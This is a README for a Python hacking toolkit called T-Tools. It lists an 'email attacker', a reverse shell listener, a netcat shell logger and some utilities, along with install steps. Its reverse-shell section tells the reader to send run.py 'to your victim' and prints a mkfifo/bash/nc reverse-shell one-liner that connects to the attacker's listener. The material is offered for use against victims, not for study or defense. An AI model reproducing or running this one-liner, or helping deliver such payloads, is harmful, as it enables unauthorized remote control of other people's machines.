# T-Tools-advanced--cyber-security


# What is T-Tools

T-Tools is an advanced cyber-security tools set.


# What does it includes

What does it include for cyber-security

An email attacker
A web scrapper
An advanced  reverse shell listener
An advanced netcat shell logger

What does it include for normal work

It includes 

A random password generator
simple phone number locator

# Installation

 this works for almost every operating system
 
 In your terminal type these commands
 
    $ sudo install git
    $ git clone https://github.com/Hirukshacoder/T-Tools-advanced--cyber-security/
    $ cd T-Tools-advanced--cyber-security
    $ pip install -r requirements.txt
    $ python3 main.py
           
# Reverse shells 
 
To use the listener change the ip in listener.py and run it to start listening


Then send the run.py file to your victim.


    kali@attacker ~ $ python3 listen.py
    kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 9999 >/tmp/f  
           
made by Treveen
